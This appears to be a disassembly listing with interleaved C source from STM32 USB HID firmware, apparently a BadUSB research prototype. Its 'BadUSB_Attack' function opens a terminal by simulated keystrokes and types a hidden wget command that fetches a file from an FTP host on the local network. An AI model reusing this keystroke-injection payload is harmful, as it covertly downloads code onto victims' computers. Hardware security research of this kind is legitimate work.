 8000a5c:	687a      	ldr	r2, [r7, #4]
 8000a5e:	4413      	add	r3, r2
 8000a60:	781a      	ldrb	r2, [r3, #0]
 8000a62:	7bfb      	ldrb	r3, [r7, #15]
 8000a64:	6879      	ldr	r1, [r7, #4]
 8000a66:	440b      	add	r3, r1
 8000a68:	f022 0208 	bic.w	r2, r2, #8
 8000a6c:	b2d2      	uxtb	r2, r2
 8000a6e:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 8000a70:	7bfb      	ldrb	r3, [r7, #15]
 8000a72:	3320      	adds	r3, #32
 8000a74:	687a      	ldr	r2, [r7, #4]
 8000a76:	4413      	add	r3, r2
 8000a78:	781a      	ldrb	r2, [r3, #0]
 8000a7a:	7bfb      	ldrb	r3, [r7, #15]
 8000a7c:	3320      	adds	r3, #32
 8000a7e:	6879      	ldr	r1, [r7, #4]
 8000a80:	440b      	add	r3, r1
 8000a82:	f042 0208 	orr.w	r2, r2, #8
 8000a86:	b2d2      	uxtb	r2, r2
 8000a88:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a8a:	7bfb      	ldrb	r3, [r7, #15]
 8000a8c:	3301      	adds	r3, #1
 8000a8e:	73fb      	strb	r3, [r7, #15]
 8000a90:	7bfb      	ldrb	r3, [r7, #15]
 8000a92:	2b5a      	cmp	r3, #90	; 0x5a
 8000a94:	d9e1      	bls.n	8000a5a <Convert2CapsMap+0xe>
	}
}
 8000a96:	bf00      	nop
 8000a98:	bf00      	nop
 8000a9a:	3714      	adds	r7, #20
 8000a9c:	46bd      	mov	sp, r7
 8000a9e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000aa2:	4770      	bx	lr

08000aa4 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000aa4:	b580      	push	{r7, lr}
 8000aa6:	b082      	sub	sp, #8
 8000aa8:	af00      	add	r7, sp, #0
 8000aaa:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000aac:	687b      	ldr	r3, [r7, #4]
 8000aae:	681b      	ldr	r3, [r3, #0]
 8000ab0:	2b01      	cmp	r3, #1
 8000ab2:	d10f      	bne.n	8000ad4 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000ab4:	687b      	ldr	r3, [r7, #4]
 8000ab6:	2200      	movs	r2, #0
 8000ab8:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 8000aba:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000abe:	695b      	ldr	r3, [r3, #20]
 8000ac0:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000ac4:	f043 0301 	orr.w	r3, r3, #1
 8000ac8:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000aca:	f000 f9ff 	bl	8000ecc <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000ace:	4803      	ldr	r0, [pc, #12]	; (8000adc <InterruptTrap+0x38>)
 8000ad0:	f004 f948 	bl	8004d64 <HAL_TIM_Base_Start_IT>
	}
}
 8000ad4:	bf00      	nop
 8000ad6:	3708      	adds	r7, #8
 8000ad8:	46bd      	mov	sp, r7
 8000ada:	bd80      	pop	{r7, pc}
 8000adc:	200002e4 	.word	0x200002e4

08000ae0 <TestHID>:

int TestHID(){
 8000ae0:	b580      	push	{r7, lr}
 8000ae2:	b082      	sub	sp, #8
 8000ae4:	af00      	add	r7, sp, #0
	char testStr[4] = {133, 133, 133, 133};
 8000ae6:	f04f 3385 	mov.w	r3, #2240120197	; 0x85858585
 8000aea:	603b      	str	r3, [r7, #0]
	SimulateKeyStroke(133);
 8000aec:	2085      	movs	r0, #133	; 0x85
 8000aee:	f7ff ff2d 	bl	800094c <SimulateKeyStroke>
	uint8_t PrevState = recv_buffer[0]&0x01;
 8000af2:	4b0d      	ldr	r3, [pc, #52]	; (8000b28 <TestHID+0x48>)
 8000af4:	781b      	ldrb	r3, [r3, #0]
 8000af6:	f003 0301 	and.w	r3, r3, #1
 8000afa:	71fb      	strb	r3, [r7, #7]
	SimulateKeyStrokes(testStr, 4, &PrintCnt);
 8000afc:	463b      	mov	r3, r7
 8000afe:	4a0b      	ldr	r2, [pc, #44]	; (8000b2c <TestHID+0x4c>)
 8000b00:	2104      	movs	r1, #4
 8000b02:	4618      	mov	r0, r3
 8000b04:	f7ff ff64 	bl	80009d0 <SimulateKeyStrokes>
	uint8_t CurrState = recv_buffer[0]&0x01;
 8000b08:	4b07      	ldr	r3, [pc, #28]	; (8000b28 <TestHID+0x48>)
 8000b0a:	781b      	ldrb	r3, [r3, #0]
 8000b0c:	f003 0301 	and.w	r3, r3, #1
 8000b10:	71bb      	strb	r3, [r7, #6]
	return PrevState == CurrState;
 8000b12:	79fa      	ldrb	r2, [r7, #7]
 8000b14:	79bb      	ldrb	r3, [r7, #6]
 8000b16:	429a      	cmp	r2, r3
 8000b18:	bf0c      	ite	eq
 8000b1a:	2301      	moveq	r3, #1
 8000b1c:	2300      	movne	r3, #0
 8000b1e:	b2db      	uxtb	r3, r3
}
 8000b20:	4618      	mov	r0, r3
 8000b22:	3708      	adds	r7, #8
 8000b24:	46bd      	mov	sp, r7
 8000b26:	bd80      	pop	{r7, pc}
 8000b28:	2000026c 	.word	0x2000026c
 8000b2c:	20000278 	.word	0x20000278

08000b30 <BadUSB_Attack>:

void BadUSB_Attack(int stage){
 8000b30:	b580      	push	{r7, lr}
 8000b32:	b0c4      	sub	sp, #272	; 0x110
 8000b34:	af00      	add	r7, sp, #0
 8000b36:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b3a:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b3e:	6018      	str	r0, [r3, #0]
#if Target == FPGA
	if(stage == 0){
 8000b40:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b44:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b48:	681b      	ldr	r3, [r3, #0]
 8000b4a:	2b00      	cmp	r3, #0
 8000b4c:	d125      	bne.n	8000b9a <BadUSB_Attack+0x6a>
		uint8_t Terminal[3] = LinuxTerminal;
 8000b4e:	4a37      	ldr	r2, [pc, #220]	; (8000c2c <BadUSB_Attack+0xfc>)
 8000b50:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000b54:	6812      	ldr	r2, [r2, #0]
 8000b56:	4611      	mov	r1, r2
 8000b58:	8019      	strh	r1, [r3, #0]
 8000b5a:	3302      	adds	r3, #2
 8000b5c:	0c12      	lsrs	r2, r2, #16
 8000b5e:	701a      	strb	r2, [r3, #0]
		char AttackStr0[256];
		strcpy(AttackStr0,
 8000b60:	f107 0308 	add.w	r3, r7, #8
 8000b64:	4a32      	ldr	r2, [pc, #200]	; (8000c30 <BadUSB_Attack+0x100>)
 8000b66:	4618      	mov	r0, r3
 8000b68:	4611      	mov	r1, r2
 8000b6a:	235f      	movs	r3, #95	; 0x5f
 8000b6c:	461a      	mov	r2, r3
 8000b6e:	f00c fa8d 	bl	800d08c <memcpy>
				"cd /home/user/Templates\nwget -q ftp://anonymous:@192.168.59.207/MSCDrv >/dev/null 2>&1 &\nexit\n");
		SimulateShortcutKey(Terminal, 3);
 8000b72:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000b76:	2103      	movs	r1, #3
 8000b78:	4618      	mov	r0, r3
 8000b7a:	f7ff fefd 	bl	8000978 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 8000b7e:	f107 0308 	add.w	r3, r7, #8
 8000b82:	4618      	mov	r0, r3
 8000b84:	f7ff fb22 	bl	80001cc <strlen>
 8000b88:	4603      	mov	r3, r0
 8000b8a:	4619      	mov	r1, r3
 8000b8c:	f107 0308 	add.w	r3, r7, #8
 8000b90:	4a28      	ldr	r2, [pc, #160]	; (8000c34 <BadUSB_Attack+0x104>)
 8000b92:	4618      	mov	r0, r3
 8000b94:	f7ff ff1c 	bl	80009d0 <SimulateKeyStrokes>
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}
 8000b98:	e042      	b.n	8000c20 <BadUSB_Attack+0xf0>
	}else if(stage == 1){
 8000b9a:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b9e:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000ba2:	681b      	ldr	r3, [r3, #0]
 8000ba4:	2b01      	cmp	r3, #1
 8000ba6:	d125      	bne.n	8000bf4 <BadUSB_Attack+0xc4>
		uint8_t Terminal[3] = LinuxTerminal;
 8000ba8:	4a20      	ldr	r2, [pc, #128]	; (8000c2c <BadUSB_Attack+0xfc>)
 8000baa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000bae:	6812      	ldr	r2, [r2, #0]
 8000bb0:	4611      	mov	r1, r2
 8000bb2:	8019      	strh	r1, [r3, #0]
 8000bb4:	3302      	adds	r3, #2
 8000bb6:	0c12      	lsrs	r2, r2, #16
 8000bb8:	701a      	strb	r2, [r3, #0]
		strcpy(AttackStr1,
 8000bba:	f107 0308 	add.w	r3, r7, #8
 8000bbe:	4a1e      	ldr	r2, [pc, #120]	; (8000c38 <BadUSB_Attack+0x108>)
 8000bc0:	4618      	mov	r0, r3
 8000bc2:	4611      	mov	r1, r2
 8000bc4:	234a      	movs	r3, #74	; 0x4a
 8000bc6:	461a      	mov	r2, r3
 8000bc8:	f00c fa60 	bl	800d08c <memcpy>
		SimulateShortcutKey(Terminal, 3);
 8000bcc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000bd0:	2103      	movs	r1, #3
 8000bd2:	4618      	mov	r0, r3
 8000bd4:	f7ff fed0 	bl	8000978 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000bd8:	f107 0308 	add.w	r3, r7, #8
 8000bdc:	4618      	mov	r0, r3
 8000bde:	f7ff faf5 	bl	80001cc <strlen>
 8000be2:	4603      	mov	r3, r0
 8000be4:	4619      	mov	r1, r3
 8000be6:	f107 0308 	add.w	r3, r7, #8
 8000bea:	4a12      	ldr	r2, [pc, #72]	; (8000c34 <BadUSB_Attack+0x104>)
 8000bec:	4618      	mov	r0, r3
 8000bee:	f7ff feef 	bl	80009d0 <SimulateKeyStrokes>
}
 8000bf2:	e015      	b.n	8000c20 <BadUSB_Attack+0xf0>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000bf4:	f107 0308 	add.w	r3, r7, #8
 8000bf8:	4a10      	ldr	r2, [pc, #64]	; (8000c3c <BadUSB_Attack+0x10c>)
 8000bfa:	4618      	mov	r0, r3
 8000bfc:	4611      	mov	r1, r2
 8000bfe:	234e      	movs	r3, #78	; 0x4e
 8000c00:	461a      	mov	r2, r3
 8000c02:	f00c fa43 	bl	800d08c <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000c06:	f107 0308 	add.w	r3, r7, #8
 8000c0a:	4618      	mov	r0, r3
 8000c0c:	f7ff fade 	bl	80001cc <strlen>
 8000c10:	4603      	mov	r3, r0
 8000c12:	4619      	mov	r1, r3
 8000c14:	f107 0308 	add.w	r3, r7, #8
 8000c18:	4a06      	ldr	r2, [pc, #24]	; (8000c34 <BadUSB_Attack+0x104>)
 8000c1a:	4618      	mov	r0, r3
 8000c1c:	f7ff fed8 	bl	80009d0 <SimulateKeyStrokes>
}
 8000c20:	bf00      	nop
 8000c22:	f507 7788 	add.w	r7, r7, #272	; 0x110
 8000c26:	46bd      	mov	sp, r7
 8000c28:	bd80      	pop	{r7, pc}
 8000c2a:	bf00      	nop
 8000c2c:	0800d244 	.word	0x0800d244
 8000c30:	0800d148 	.word	0x0800d148
 8000c34:	20000278 	.word	0x20000278
 8000c38:	0800d1a8 	.word	0x0800d1a8
 8000c3c:	0800d1f4 	.word	0x0800d1f4

08000c40 <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000c40:	b580      	push	{r7, lr}
 8000c42:	b082      	sub	sp, #8
 8000c44:	af00      	add	r7, sp, #0
 8000c46:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000c48:	687b      	ldr	r3, [r7, #4]
 8000c4a:	4a1d      	ldr	r2, [pc, #116]	; (8000cc0 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000c4c:	4293      	cmp	r3, r2
 8000c4e:	d133      	bne.n	8000cb8 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000c50:	4b1c      	ldr	r3, [pc, #112]	; (8000cc4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c52:	681b      	ldr	r3, [r3, #0]
 8000c54:	2b00      	cmp	r3, #0
 8000c56:	d108      	bne.n	8000c6a <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000c58:	2080      	movs	r0, #128	; 0x80
 8000c5a:	f7ff fda1 	bl	80007a0 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000c5e:	220f      	movs	r2, #15
 8000c60:	4919      	ldr	r1, [pc, #100]	; (8000cc8 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000c62:	481a      	ldr	r0, [pc, #104]	; (8000ccc <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000c64:	f007 feec 	bl	8008a40 <USBD_CUSTOM_HID_SendReport>
 8000c68:	e018      	b.n	8000c9c <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000c6a:	4b16      	ldr	r3, [pc, #88]	; (8000cc4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c6c:	681b      	ldr	r3, [r3, #0]
 8000c6e:	2b01      	cmp	r3, #1
 8000c70:	d10c      	bne.n	8000c8c <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000c72:	f7ff fe59 	bl	8000928 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000c76:	4b16      	ldr	r3, [pc, #88]	; (8000cd0 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000c78:	781b      	ldrb	r3, [r3, #0]
 8000c7a:	f003 0302 	and.w	r3, r3, #2
 8000c7e:	2b00      	cmp	r3, #0
 8000c80:	d10c      	bne.n	8000c9c <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000c82:	4b10      	ldr	r3, [pc, #64]	; (8000cc4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c84:	f04f 32ff 	mov.w	r2, #4294967295
 8000c88:	601a      	str	r2, [r3, #0]
 8000c8a:	e007      	b.n	8000c9c <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000c8c:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000c90:	681b      	ldr	r3, [r3, #0]
 8000c92:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000c96:	f023 0301 	bic.w	r3, r3, #1
 8000c9a:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000c9c:	4b09      	ldr	r3, [pc, #36]	; (8000cc4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c9e:	681b      	ldr	r3, [r3, #0]
 8000ca0:	1c59      	adds	r1, r3, #1
 8000ca2:	4b0c      	ldr	r3, [pc, #48]	; (8000cd4 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000ca4:	fb83 3201 	smull	r3, r2, r3, r1
 8000ca8:	17cb      	asrs	r3, r1, #31
 8000caa:	1ad2      	subs	r2, r2, r3
 8000cac:	4613      	mov	r3, r2
 8000cae:	005b      	lsls	r3, r3, #1
 8000cb0:	4413      	add	r3, r2
 8000cb2:	1aca      	subs	r2, r1, r3
 8000cb4:	4b03      	ldr	r3, [pc, #12]	; (8000cc4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000cb6:	601a      	str	r2, [r3, #0]
	}
}
 8000cb8:	bf00      	nop
 8000cba:	3708      	adds	r7, #8
 8000cbc:	46bd      	mov	sp, r7
 8000cbe:	bd80      	pop	{r7, pc}
 8000cc0:	200002e4 	.word	0x200002e4
 8000cc4:	20000274 	.word	0x20000274
 8000cc8:	2000025c 	.word	0x2000025c
 8000ccc:	200003c0 	.word	0x200003c0
 8000cd0:	2000026c 	.word	0x2000026c
 8000cd4:	55555556 	.word	0x55555556

08000cd8 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000cd8:	b480      	push	{r7}
 8000cda:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000cdc:	b672      	cpsid	i
}
 8000cde:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000ce0:	e7fe      	b.n	8000ce0 <Error_Handler+0x8>
	...

08000ce4 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000ce4:	b580      	push	{r7, lr}
 8000ce6:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000ce8:	4b1b      	ldr	r3, [pc, #108]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000cea:	4a1c      	ldr	r2, [pc, #112]	; (8000d5c <MX_SPI1_Init+0x78>)
 8000cec:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000cee:	4b1a      	ldr	r3, [pc, #104]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000cf0:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000cf4:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000cf6:	4b18      	ldr	r3, [pc, #96]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000cf8:	2200      	movs	r2, #0
 8000cfa:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000cfc:	4b16      	ldr	r3, [pc, #88]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000cfe:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000d02:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000d04:	4b14      	ldr	r3, [pc, #80]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d06:	2200      	movs	r2, #0
 8000d08:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000d0a:	4b13      	ldr	r3, [pc, #76]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d0c:	2200      	movs	r2, #0
 8000d0e:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000d10:	4b11      	ldr	r3, [pc, #68]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d12:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000d16:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000d18:	4b0f      	ldr	r3, [pc, #60]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d1a:	2228      	movs	r2, #40	; 0x28
 8000d1c:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000d1e:	4b0e      	ldr	r3, [pc, #56]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d20:	2200      	movs	r2, #0
 8000d22:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000d24:	4b0c      	ldr	r3, [pc, #48]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d26:	2200      	movs	r2, #0
 8000d28:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000d2a:	4b0b      	ldr	r3, [pc, #44]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d2c:	2200      	movs	r2, #0
 8000d2e:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000d30:	4b09      	ldr	r3, [pc, #36]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d32:	2207      	movs	r2, #7
 8000d34:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000d36:	4b08      	ldr	r3, [pc, #32]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d38:	2200      	movs	r2, #0
 8000d3a:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000d3c:	4b06      	ldr	r3, [pc, #24]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d3e:	2208      	movs	r2, #8
 8000d40:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000d42:	4805      	ldr	r0, [pc, #20]	; (8000d58 <MX_SPI1_Init+0x74>)
 8000d44:	f003 ff14 	bl	8004b70 <HAL_SPI_Init>
 8000d48:	4603      	mov	r3, r0
 8000d4a:	2b00      	cmp	r3, #0
 8000d4c:	d001      	beq.n	8000d52 <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000d4e:	f7ff ffc3 	bl	8000cd8 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000d52:	bf00      	nop
 8000d54:	bd80      	pop	{r7, pc}
 8000d56:	bf00      	nop
 8000d58:	20000280 	.word	0x20000280
 8000d5c:	40013000 	.word	0x40013000

08000d60 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000d60:	b580      	push	{r7, lr}
 8000d62:	b08a      	sub	sp, #40	; 0x28
 8000d64:	af00      	add	r7, sp, #0
 8000d66:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000d68:	f107 0314 	add.w	r3, r7, #20
 8000d6c:	2200      	movs	r2, #0
 8000d6e:	601a      	str	r2, [r3, #0]
 8000d70:	605a      	str	r2, [r3, #4]
 8000d72:	609a      	str	r2, [r3, #8]
 8000d74:	60da      	str	r2, [r3, #12]
 8000d76:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000d78:	687b      	ldr	r3, [r7, #4]
 8000d7a:	681b      	ldr	r3, [r3, #0]
 8000d7c:	4a17      	ldr	r2, [pc, #92]	; (8000ddc <HAL_SPI_MspInit+0x7c>)
 8000d7e:	4293      	cmp	r3, r2
 8000d80:	d128      	bne.n	8000dd4 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000d82:	4b17      	ldr	r3, [pc, #92]	; (8000de0 <HAL_SPI_MspInit+0x80>)
 8000d84:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d86:	4a16      	ldr	r2, [pc, #88]	; (8000de0 <HAL_SPI_MspInit+0x80>)
 8000d88:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000d8c:	6613      	str	r3, [r2, #96]	; 0x60
 8000d8e:	4b14      	ldr	r3, [pc, #80]	; (8000de0 <HAL_SPI_MspInit+0x80>)
 8000d90:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d92:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000d96:	613b      	str	r3, [r7, #16]
 8000d98:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000d9a:	4b11      	ldr	r3, [pc, #68]	; (8000de0 <HAL_SPI_MspInit+0x80>)
 8000d9c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d9e:	4a10      	ldr	r2, [pc, #64]	; (8000de0 <HAL_SPI_MspInit+0x80>)
 8000da0:	f043 0301 	orr.w	r3, r3, #1
 8000da4:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000da6:	4b0e      	ldr	r3, [pc, #56]	; (8000de0 <HAL_SPI_MspInit+0x80>)
 8000da8:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000daa:	f003 0301 	and.w	r3, r3, #1
 8000dae:	60fb      	str	r3, [r7, #12]
 8000db0:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000db2:	23c2      	movs	r3, #194	; 0xc2
 8000db4:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000db6:	2302      	movs	r3, #2
 8000db8:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000dba:	2300      	movs	r3, #0
 8000dbc:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000dbe:	2303      	movs	r3, #3
 8000dc0:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000dc2:	2305      	movs	r3, #5
 8000dc4:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000dc6:	f107 0314 	add.w	r3, r7, #20
 8000dca:	4619      	mov	r1, r3
 8000dcc:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000dd0:	f000 fdd4 	bl	800197c <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000dd4:	bf00      	nop
 8000dd6:	3728      	adds	r7, #40	; 0x28
 8000dd8:	46bd      	mov	sp, r7
 8000dda:	bd80      	pop	{r7, pc}
 8000ddc:	40013000 	.word	0x40013000
 8000de0:	40021000 	.word	0x40021000

08000de4 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000de4:	b480      	push	{r7}
 8000de6:	b083      	sub	sp, #12
 8000de8:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000dea:	4b0f      	ldr	r3, [pc, #60]	; (8000e28 <HAL_MspInit+0x44>)
 8000dec:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000dee:	4a0e      	ldr	r2, [pc, #56]	; (8000e28 <HAL_MspInit+0x44>)
 8000df0:	f043 0301 	orr.w	r3, r3, #1
 8000df4:	6613      	str	r3, [r2, #96]	; 0x60
 8000df6:	4b0c      	ldr	r3, [pc, #48]	; (8000e28 <HAL_MspInit+0x44>)
 8000df8:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000dfa:	f003 0301 	and.w	r3, r3, #1
 8000dfe:	607b      	str	r3, [r7, #4]
 8000e00:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000e02:	4b09      	ldr	r3, [pc, #36]	; (8000e28 <HAL_MspInit+0x44>)
 8000e04:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000e06:	4a08      	ldr	r2, [pc, #32]	; (8000e28 <HAL_MspInit+0x44>)
 8000e08:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000e0c:	6593      	str	r3, [r2, #88]	; 0x58
 8000e0e:	4b06      	ldr	r3, [pc, #24]	; (8000e28 <HAL_MspInit+0x44>)
 8000e10:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000e12:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000e16:	603b      	str	r3, [r7, #0]
 8000e18:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000e1a:	bf00      	nop
 8000e1c:	370c      	adds	r7, #12
 8000e1e:	46bd      	mov	sp, r7
 8000e20:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e24:	4770      	bx	lr
 8000e26:	bf00      	nop
 8000e28:	40021000 	.word	0x40021000

08000e2c <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
